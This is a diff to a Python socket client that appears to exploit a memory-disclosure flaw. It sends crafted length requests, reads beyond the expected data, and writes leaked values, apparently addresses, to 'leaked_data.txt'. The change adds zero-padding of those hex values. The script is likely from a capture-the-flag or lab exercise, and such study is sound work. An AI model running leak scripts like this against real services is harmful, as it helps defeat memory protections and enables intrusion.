@@ -16,6 +16,11 @@ except socket.error as msg:
     print(msg)
     sys.exit(1)
 
+def zerochecker(bytes, expectedLength):
+    while len(bytes) != expectedLength:
+        bytes = "0x0" + bytes[2:]
+    return bytes
+
 try:
 
     fo = open("leaked_data.txt", "a")
@@ -31,8 +36,8 @@ try:
     while amount_received < amount_expected:
         data = sock.recv(32)
         amount_received += len(data)
-        print(hex(int.from_bytes(data[24:],"little")))
-        fo.write(hex(int.from_bytes(data[24:],"little")))
+        print(zerochecker(hex(int.from_bytes(data[24:],"little")),18))
+        fo.write(zerochecker(hex(int.from_bytes(data[24:],"little")),18))
 
     # Send data
     message = b'\n6\n'
@@ -44,8 +49,8 @@ try:
     while amount_received < amount_expected:
         data = sock.recv(6)
         amount_received += len(data)
-        print(hex(int.from_bytes(data,"little")-224))
-        fo.write(" " + hex(int.from_bytes(data,"little")-224))
+        print(zerochecker(hex(int.from_bytes(data,"little")-224),14))
+        fo.write(" " + zerochecker(hex(int.from_bytes(data,"little")-224),14))
 
     # Send data
     message = b'\n280\n'
@@ -57,8 +62,8 @@ try:
     while amount_received < amount_expected:
         data = sock.recv(280)
         amount_received += len(data)
-        print(hex(int.from_bytes(data[272:],"little")))
-        fo.write(" " + hex(int.from_bytes(data[272:],"little")) + "\n")
+        print(zerochecker(hex(int.from_bytes(data[272:],"little")),14))
+        fo.write(" " + zerochecker(hex(int.from_bytes(data[272:],"little")),14) + "\n")
 
 finally:
     print('closing socket')
